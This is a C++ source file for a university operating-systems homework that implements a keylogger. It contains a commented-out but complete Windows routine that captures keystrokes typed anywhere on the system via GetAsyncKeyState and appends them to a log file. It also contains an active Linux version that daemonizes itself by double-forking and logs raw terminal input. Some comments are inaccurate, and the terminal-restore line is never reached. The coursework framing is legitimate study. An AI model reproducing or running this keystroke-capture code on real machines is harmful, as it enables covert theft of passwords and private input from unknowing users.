/* 
Operating Systems - CS444/544
Spring 2023
Payton Shafer
HW3: KeyLogger
Program Description: This program will take in all input from the keyboard and log it to a text file ran as a daemon
Last Modified: 3/28/2023
Code Review: https://youtu.be/1jeD-bBQQ3U */

// Includes
#include <iostream> //standard I/O library
#include <unistd.h> //This library gives access to the POSIX system api so we can controll the threads (create a daemon)
//#include <windows.h> //This libarary is used for the example key logger on windows
//#include <winuser.h> //This libarary is used for the example key logger on windows
#include <fstream> //This is the file stream library, it will be used to write the keys to the log file

using namespace std; //The namespace I will use is the standard one

// Constants/Defines - none

// Global Variables - none

// Functions
//This function handles the logging of the keys on windows, this is a full key logger that will capture keys typed anywhere
//The catch is that it only runs on windows OS, but I will talk briefly about how it works to show I understand key logging
/*void StartLogging(){
    char c; //declare char c that will be read in
    
    while(1){ //create a infinite loop for the keys to be logged in
        
        for(c=8;c<=222;c++){
            if(GetAsyncKeyState(c)==-32767){
            
            ofstream write("Log.txt", ios::app); //create a lof file to write to
            
            if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) ) //checks for character and shift key
            {
                c+=32; //add this to make character key uppercase
                write<<c; //write to file
                write.close();
                break;
            }
            else if((c>64)&&(c<91)) //checks for just a character
            {
                write<<c; //just write the character
                write.close();
                break;
            }
            else { //cases where key that was read in is not a character (a-z)
                
                switch (c) //This is a switch statement to deal with the number keys and shifting
                {
                    case 48: //case for the 0/)
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state                            
                            write<<")";
                        else
                            write<<"0";    
                        }   
                    break;

                    case 49: //case for 1/!
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state   
                            write<<"!";
                        else
                            write<<"1";    
                        }   
                    break;
                    
                    case 50: //case for 2/@
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state                               
                            write<<"@";
                        else
                            write<<"2";    
                        }
                    break;
                    case 51: //case for 3/#
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state                               
                            write<<"#";
                        else
                            write<<"3";    
                        }   
                    break;  
                    case 52: //case for 4/$
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state     
                            write<<"$";
                        else
                            write<<"4";    
                        }   
                    break;  
                    case 53: //case for 5/%
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state     
                            write<<"%";
                        else
                            write<<"5";    
                        }   
                    break;
                    case 54: //case for 6/^
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state     
                            write<<"^";
                        else
                            write<<"6";    
                        }   
                    break;
                    case 55: //case for 7/&
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state      
                            write<<"&";
                        else
                            write<<"7";    
                        }   
                    break;
                    case 56: //case for 8 and *
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state       
                            write<<"*";
                        else
                            write<<"8";    
                        }   
                    break; //case for 9/(
                    case 57:
                    {
                        if(GetAsyncKeyState(0x10)) //check shift state       
                            write<<"(";
                        else
                            write<<"9";    
                        }   
                    break;
                    
                    case VK_SPACE: //case for space bar
                        write<<" ";
                        break;
                    case VK_RETURN: //case for return button
                        write<<"\n";
                        break;  
                    case VK_TAB: //case for tab
                        write<<"  ";
                        break;
                   case VK_BACK: //case for backspace
                        write<<"<BACKSPACE>";
                        break;
                    case VK_DELETE: //case for delete button
                        write<<"<Del>";
                        break;  
                    
                    default: //default case just write c
                        write<<c;
                
                } //end switch 
           
            } //end else
        } //end for
    } //end while
}*/

//This function is the logging function I will use within the daemon it will log keys to a log file
void StartLogging(){
    char c; //declare char c to be logged
    ofstream out("out.txt"); //declare the out stream
    // Set the terminal to raw mode so the user doesn't need to press enter
    system("stty raw");
    while(1) { //infinite loop to always log keys
        c = getchar(); //read the char
        out << c << endl; //write the char to the log file
    }
    system("stty cooked"); //set terminal back to cooked mode (back to the original state)
    out.close(); //close the out file
}

//The below main function is for an example to run the key logger as is, it captures all keys and writes them to a txt file
/*int main(){
    StartLogging();
}*/


// Main
int main() {
    //fork of the parent process and termite if it was sucessful
    pid_t pid = fork(); //fork off from parent process
    if (pid < 0){ //this is a check for if the fork worked
        perror("Something went wrong with fork()"); //return the error
        exit(1); //exit with code 1 since fork failed
    } else if (pid > 0){ //check if this is the parent process
        exit(0); // exit parent processes with code 0 (kill parent process)
    }

    //Create a new session with setsid()
    if(setsid() < 0){ //check that setsid didnt return an error
        perror("Something went wrong with setsid()"); //return the error
        exit(1); //exit with code 1 since setsid failed
    }

    //fork again to let parent process terminate to ensure 
    //that you get rid of the session leading process
    pid = fork(); //fork off from parent process
    if (pid < 0){ //check if fork returns an error
        perror("Something went wrong with fork()"); //return the error so the user knows
        exit(1); //exit with code 1 since fork failed
    } else if (pid > 0){ //check if this is the parent process
        exit(0); // exit parent processes with code 0 (kill parent process)
    }

    //This is the infinite loop where the keylogging will take place
    StartLogging();

    return 0; //return 0 at end since everything worked correctly
}